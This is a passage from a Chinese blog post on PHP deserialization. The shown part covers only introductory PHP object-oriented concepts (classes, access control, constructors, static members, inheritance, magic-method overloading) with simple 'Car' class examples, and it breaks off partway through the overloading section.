class="nav-number">1.3.3.5.1.</span> <span class="nav-text"> MTCTF2022决赛</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#byte2019ezcms"><span class="nav-number">1.3.3.6.</span> <span class="nav-text"> Byte2019EZCMS</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B"><span class="nav-number">1.3.3.6.1.</span> <span class="nav-text"> 解题过程：</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">1.3.4.</span> <span class="nav-text"> Session反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFsession"><span class="nav-number">1.3.4.1.</span> <span class="nav-text"> 什么是session</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#php-session%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B"><span class="nav-number">1.3.4.2.</span> <span class="nav-text"> PHP session工作流程</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#phpini-session%E9%85%8D%E7%BD%AE"><span class="nav-number">1.3.4.3.</span> <span class="nav-text"> php.ini session配置</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#php-session%E5%BA%8F%E5%88%97%E5%8C%96%E6%9C%BA%E5%88%B6"><span class="nav-number">1.3.4.4.</span> <span class="nav-text"> PHP session序列化机制</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#php%E5%A4%84%E7%90%86%E5%99%A8"><span class="nav-number">1.3.4.5.</span> <span class="nav-text"> php处理器</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#php_binary%E5%A4%84%E7%90%86%E5%99%A8"><span class="nav-number">1.3.4.6.</span> <span class="nav-text"> php_binary处理器</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#php_serialize-%E5%A4%84%E7%90%86%E5%99%A8"><span class="nav-number">1.3.4.7.</span> <span class="nav-text"> php_serialize 处理器</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#session%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">1.3.4.8.</span> <span class="nav-text"> session的反序列化漏洞利用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0"><span class="nav-number">1.3.4.9.</span> <span class="nav-text"> 漏洞成因</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ctf%E4%BE%8B%E9%A2%98phpinfo"><span class="nav-number">1.3.4.10.</span> <span class="nav-text"> CTF例题：PHPINFO</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A1%86%E6%9E%B6%E9%93%BE%E5%AD%90"><span class="nav-number">1.3.5.</span> <span class="nav-text"> 框架链子</span></a></li></ol></li></ol></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="TWe1v3"
      src="/images/twe1v3.gif">
  <p class="site-author-name" itemprop="name">TWe1v3</p>
  <div class="site-description" itemprop="description">TWe1v3的博客</div>
</div>
<div class="site-state-wrap site-overview-item animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">19</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">9</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">18</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author site-overview-item animated">
      <span class="links-of-author-item">
        <a href="https://github.com/TWe1v3" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;TWe1v3" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:twe1v3@qq.com" title="E-Mail → mailto:twe1v3@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>



        </div>
      </div>

    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>
  <div class="reading-progress-bar"></div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://twe1v3.github.io/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/twe1v3.gif">
      <meta itemprop="name" content="TWe1v3">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="TWe1v3">
      <meta itemprop="description" content="TWe1v3的博客">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="PHP反序列化 | TWe1v3">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          PHP反序列化
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2022-11-01 11:29:01 / 修改时间：11:42:34" itemprop="dateCreated datePublished" datetime="2022-11-01T11:29:01+08:00">2022-11-01</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" itemprop="url" rel="index"><span itemprop="name">反序列化</span></a>
        </span>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>71k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>1:04</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <p>PHP反序列化的学习总结，还有实践总结嗷QWQ</p>
<span id="more"></span>
<h1 id="反序列化漏洞"><a class="markdownIt-Anchor" href="#反序列化漏洞"></a> 反序列化漏洞</h1>
<p>​                                                                                                         --------------------------------<strong>TWe1v3</strong></p>
<h2 id="php类和对象详解"><a class="markdownIt-Anchor" href="#php类和对象详解"></a> PHP类和对象详解</h2>
<h3 id="一-php类和对象"><a class="markdownIt-Anchor" href="#一-php类和对象"></a> 一、PHP类和对象</h3>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span><span class="comment">//定义一个类class Car &#123;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$name</span> = <span class="string">&#x27;手机&#x27;</span>;    <span class="function"><span class="keyword">function</span> <span class="title">getName</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="comment">//实例化一个car对象$car = new Car();$car-&gt;name = &#x27;iPhone&#x27;; </span></span><br><span class="line"></span><br><span class="line"><span class="comment">//设置对象的属性值echo $car-&gt;getName();  //调用对象的方法 输出对象的名字</span></span><br></pre></td></tr></table></figure>
<h3 id="二-类的属性"><a class="markdownIt-Anchor" href="#二-类的属性"></a> 二、类的属性</h3>
<p>在类中定义的变量称之为属性，通常属性跟数据库中的字段有一定的关联，因此也可以称作“字段”。属性声明是由关键字 public，protected 或者 private 开头，后面跟一个普通的变量声明来组成。属性的变量可以设置初始化的默认值，默认值必须是常量。</p>
<p>访问控制的关键字代表的意义为：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span>：公开的 <span class="keyword">protected</span>：受保护的 <span class="keyword">private</span>：私有的</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span> </span>&#123;    <span class="comment">//定义公共属性    public $name = &#x27;汽车&#x27;;   </span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//定义受保护的属性    protected $corlor = &#x27;白色&#x27;;    </span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//定义私有属性    private $price = &#x27;100000&#x27;;&#125;</span></span><br><span class="line"></span><br><span class="line">默认都为<span class="keyword">public</span>，外部可以访问。一般通过-&gt;对象操作符来访问对象的属性或者方法，对于静态属性则使用::双冒号进行访问。当在类成员方法内部调用的时候，可以使用<span class="variable language_">$this</span>伪变量调用当前对象的属性。</span><br><span class="line"></span><br><span class="line"><span class="variable">$car</span> = <span class="keyword">new</span> <span class="title class_">Car</span>();<span class="keyword">echo</span> <span class="variable">$car</span>-&gt;name;   </span><br><span class="line"></span><br><span class="line"><span class="comment">//调用对象的属性echo $car-&gt;color;  //错误 受保护的属性不允许外部调用echo $car-&gt;price;  //错误 私有属性不允许外部调用</span></span><br><span class="line"></span><br><span class="line">受保护的属性与私有属性不允许外部调用，在类的成员方法内部是可以调用的。</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span></span>&#123;    <span class="keyword">private</span> <span class="variable">$price</span> = <span class="string">&#x27;1000&#x27;</span>;    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getPrice</span>(<span class="params"></span>) </span>&#123;        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;price; <span class="comment">//内部访问私有属性    &#125;&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="三-类的方法"><a class="markdownIt-Anchor" href="#三-类的方法"></a> 三、类的方法</h3>
<p>方法就是在类中的function，很多时候我们分不清方法与函数有什么差别，在面向过程的程序设计中function叫做函数，在面向对象中function则被称之为方法。</p>
<p>同属性一样，类的方法也具有public，protected 以及 private 的访问控制。</p>
<p>访问控制的关键字代表的意义为：<br>
public：公开的<br>
protected：受保护的<br>
private：私有的</p>
<p>可以这样定义方法：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span> </span>&#123;    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getName</span>(<span class="params"></span>) </span>&#123;        <span class="keyword">return</span> <span class="string">&#x27;汽车&#x27;</span>;    &#125;&#125;<span class="variable">$car</span> = <span class="keyword">new</span> <span class="title class_">Car</span>();<span class="keyword">echo</span> <span class="variable">$car</span>-&gt;<span class="title function_ invoke__">getName</span>();</span><br><span class="line"></span><br><span class="line">使用关键字<span class="built_in">static</span>修饰的，称之为静态方法，静态方法不需要实例化对象，可以通过类名直接调用，操作符为双冒号::。</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span> </span>&#123;    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getName</span>(<span class="params"></span>) </span>&#123;        <span class="keyword">return</span> <span class="string">&#x27;汽车&#x27;</span>;    &#125;&#125;<span class="keyword">echo</span> <span class="title class_">Car</span>::<span class="title function_ invoke__">getName</span>(); <span class="comment">//结果为“汽车”</span></span><br></pre></td></tr></table></figure>
<h3 id="四-构造函数和析构函数"><a class="markdownIt-Anchor" href="#四-构造函数和析构函数"></a> 四、构造函数和析构函数</h3>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">PHP5可以在类中使用<span class="title function_ invoke__">__construct</span>()定义一个构造函数，具有构造函数的类，会在每次对象创建的时候调用该函数，因此常用来在对象创建的时候进行一些初始化工作。</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span> </span>&#123;   <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;       <span class="keyword">print</span> <span class="string">&quot;构造函数被调用\n&quot;</span>;   &#125;&#125;<span class="variable">$car</span> = <span class="keyword">new</span> <span class="title class_">Car</span>(); </span><br><span class="line"></span><br><span class="line"><span class="comment">//实例化的时候 会自动调用构造函数__construct，这里会输出一个字符串</span></span><br><span class="line"></span><br><span class="line">在子类中如果定义了__construct则不会调用父类的__construct，如果需要同时调用父类的构造函数，需要使用<span class="built_in">parent</span>::<span class="title function_ invoke__">__construct</span>()显式的调用。</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span> </span>&#123;   <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;       <span class="keyword">print</span> <span class="string">&quot;父类构造函数被调用\n&quot;</span>;   &#125;&#125;<span class="class"><span class="keyword">class</span> <span class="title">Truck</span> <span class="keyword">extends</span> <span class="title">Car</span> </span>&#123;   <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"> </span>&#123;       <span class="keyword">print</span> <span class="string">&quot;子类构造函数被调用\n&quot;</span>;       <span class="built_in">parent</span>::<span class="title function_ invoke__">__construct</span>();   &#125;&#125;<span class="variable">$car</span> = <span class="keyword">new</span> <span class="title class_">Truck</span>();</span><br><span class="line"></span><br><span class="line">同样，PHP5支持析构函数，使用<span class="title function_ invoke__">__destruct</span>()进行定义，析构函数指的是当某个对象的所有引用被删除，或者对象被显式的销毁时会执行的函数。</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span> </span>&#123;   <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;       <span class="keyword">print</span> <span class="string">&quot;构造函数被调用 \n&quot;</span>;   &#125;   <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"> </span>&#123;       <span class="keyword">print</span> <span class="string">&quot;析构函数被调用 \n&quot;</span>;   &#125;&#125;<span class="variable">$car</span> = <span class="keyword">new</span> <span class="title class_">Car</span>(); <span class="comment">//实例化时会调用构造函数echo &#x27;使用后，准备销毁car对象 \n&#x27;;unset($car); //销毁时会调用析构函数</span></span><br></pre></td></tr></table></figure>
<p>当PHP代码执行完毕以后，会自动回收与销毁对象，因此一般情况下不需要显式的去销毁对象。</p>
<h3 id="五-static静态关键字"><a class="markdownIt-Anchor" href="#五-static静态关键字"></a> 五、Static静态关键字</h3>
<p>静态属性与方法可以在不实例化类的情况下调用，直接使用类名::方法名的方式进行调用。静态属性不允许对象使用-&gt;操作符调用。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span> </span>&#123;    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$speed</span> = <span class="number">10</span>;    </span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getSpeed</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;        <span class="keyword">return</span> <span class="built_in">self</span>::<span class="variable">$speed</span>;    &#125;&#125;<span class="keyword">echo</span> <span class="title class_">Car</span>::<span class="title function_ invoke__">getSpeed</span>();  <span class="comment">//调用静态方法</span></span><br><span class="line"></span><br><span class="line">静态方法也可以通过变量来进行动态调用</span><br><span class="line"></span><br><span class="line"><span class="variable">$func</span> = <span class="string">&#x27;getSpeed&#x27;</span>;<span class="variable">$className</span> = <span class="string">&#x27;Car&#x27;</span>;<span class="keyword">echo</span> <span class="variable">$className</span>::<span class="variable">$func</span>();  <span class="comment">//动态调用静态方法</span></span><br></pre></td></tr></table></figure>
<p>静态方法中，$this伪变量不允许使用。可以使用self，parent，static在内部调用静态方法与属性。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$speed</span> = <span class="number">10</span>;    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getSpeed</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">self</span>::<span class="variable">$speed</span>;</span><br><span class="line"></span><br><span class="line">    &#125;    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">speedUp</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">self</span>::<span class="variable">$speed</span>+=<span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="class"><span class="keyword">class</span> <span class="title">BigCar</span> <span class="keyword">extends</span> <span class="title">Car</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">start</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">parent</span>::<span class="title function_ invoke__">speedUp</span>();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">BigCar</span>::<span class="title function_ invoke__">start</span>();<span class="keyword">echo</span> <span class="title class_">BigCar</span>::<span class="title function_ invoke__">getSpeed</span>();</span><br></pre></td></tr></table></figure>
<h3 id="六-访问控制"><a class="markdownIt-Anchor" href="#六-访问控制"></a> 六、访问控制</h3>
<p>访问控制通过关键字public，protected和private来实现。被定义为公有的类成员可以在任何地方被访问。被定义为受保护的类成员则可以被其自身以及其子类和父类访问。被定义为私有的类成员则只能被其定义所在的类访问。</p>
<p>类属性必须定义为公有、受保护、私有之一。为兼容PHP5以前的版本，如果采用 var 定义，则被视为公有。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="variable">$speed</span> = <span class="number">10</span>; <span class="comment">//错误 属性必须定义访问控制</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$name</span>;   <span class="comment">//定义共有属性&#125;</span></span><br><span class="line"></span><br><span class="line">类中的方法可以被定义为公有、私有或受保护。如果没有设置这些关键字，则该方法默认为公有</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="comment">//默认为共有方法</span></span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">turnLeft</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">如果构造函数定义成了私有方法，则不允许直接实例化对象了，这时候一般通过静态方法进行实例化，在设计模式中会经常使用这样的方法来控制对象的创建，比如单例模式只允许有一个全局唯一的对象。</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&#x27;object create&#x27;</span>;</span><br><span class="line"></span><br><span class="line">   &#125;    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$_object</span> = <span class="literal">null</span>;    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getInstance</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="built_in">self</span>::<span class="variable">$_object</span>)) &#123;            <span class="built_in">self</span>::<span class="variable">$_object</span> = <span class="keyword">new</span> <span class="title class_">Car</span>(); <span class="comment">//内部方法可以调用私有方法，因此这里可以创建对象</span></span><br><span class="line"></span><br><span class="line">       &#125;        <span class="keyword">return</span> <span class="built_in">self</span>::<span class="variable">$_object</span>;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="comment">//$car = new Car(); //这里不允许直接实例化对象$car = Car::getInstance(); //通过静态方法来获得一个实例</span></span><br></pre></td></tr></table></figure>
<h3 id="七-对象继承"><a class="markdownIt-Anchor" href="#七-对象继承"></a> 七、对象继承</h3>
<p>继承是面向对象程序设计中常用的一个特性，汽车是一个比较大的类，我们也可以称之为基类，除此之外，汽车还分为卡车、轿车、东风、宝马等，因为这些子类具有很多相同的属性和方法，可以采用继承汽车类来共享这些属性与方法，实现代码的复用。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$speed</span> = <span class="number">0</span>; <span class="comment">//汽车的起始速度是0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">speedUp</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;speed += <span class="number">10</span>;        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;speed;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="comment">//定义继承于Car的Truck类class Truck extends Car&#123;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">speedUp</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;speed = <span class="built_in">parent</span>::<span class="title function_ invoke__">speedUp</span>() + <span class="number">50</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="八-重载"><a class="markdownIt-Anchor" href="#八-重载"></a> 八、重载</h3>
<p>PHP中的重载指的是动态的创建属性与方法，是通过魔术方法来实现的。属性的重载通过__set，__get，__isset，__unset来分别实现对不存在属性的赋值、读取、判断属性是否设置、销毁属性。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">private</span> <span class="variable">$ary</span> = <span class="keyword">array</span>();    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$key</span>, <span class="variable">$val</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">       <span class="variable language_">$this</span>-&gt;ary[<span class="variable">$key</span>] = <span class="variable">$val</span>;</span><br><span class="line"></span><br><span class="line">   &#125;    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;ary[<span class="variable">$key</span>])) &#123;            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;ary[<span class="variable">$key</span>];</span><br><span class="line"></span><br><span class="line">       &#125;        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">   &#125;    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$key</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;ary[<span class="variable">$key</span>])) &#123;            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">       &#125;        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">   &#125;    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unset</span>(<span class="params"><span class="variable">$key</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;ary[<span class="variable">$key</span>]);</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="variable">$car</span> = <span class="keyword">new</span> <span class="title class_">Car</span>();<span class="variable">$car</span>-&gt;name = <span class="string">&#x27;汽车&#x27;</span>;  <span class="comment">//name属性动态创建并赋值echo $car-&gt;name;</span></span><br><span class="line"></span><br><span 